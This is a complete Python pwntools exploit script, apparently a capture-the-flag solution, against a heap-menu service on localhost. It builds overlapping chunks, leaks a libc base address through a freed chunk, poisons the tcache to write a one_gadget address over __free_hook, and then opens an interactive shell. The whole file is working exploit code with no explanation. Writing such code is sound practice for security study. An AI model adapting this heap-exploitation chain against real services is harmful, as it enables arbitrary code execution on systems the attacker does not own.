from pwn import *

p = remote('localhost', 7777)
libc = ELF('./libc.so.6')

one_gadget = 0x4f322

def add(size, data):
    p.sendlineafter('Choice: ', '1')
    p.sendlineafter('size: ', str(size))
    p.sendlineafter('data: ', data)

def edit(i, data):
    p.sendlineafter('Choice: ', '2')
    p.sendlineafter('index: ', str(i))
    p.sendlineafter('data: ', data)

def delete(i):
    p.sendlineafter('Choice: ', '3')
    p.sendlineafter('index: ', str(i))

def show(i):
    p.sendlineafter('Choice: ', '4')
    p.sendlineafter('index: ', str(i))
    p.recvuntil('Data: ')
    return p.recvline()[:-1].ljust(8, b'\x00')

for i in range(7):
    add(0x88, '')
for i in range(7):
    add(0xf8, '')

add(0x88, '')   # 14
add(0x18, '')   # 15
add(0xf8, '')   # 16
add(0x18, '')   # 17
add(0x18, '')   # 18

for i in range(14):
    delete(i)

delete(14)
edit(15, b'A' * 0x10 + p64(0xb0))   
delete(16)

for i in range(7):
    add(0x88, '')
add(0x88, '')   # 7

libc.address = u64(show(15)) - 0x60 - 0x3ebc40  
print(hex(libc.address))

add(0x18, '')   # 8
delete(8)
delete(15)
add(0x18, p64(libc.symbols['__free_hook']))
add(0x18, '')
add(0x18, p64(libc.address + one_gadget))
delete(0)

p.interactive()
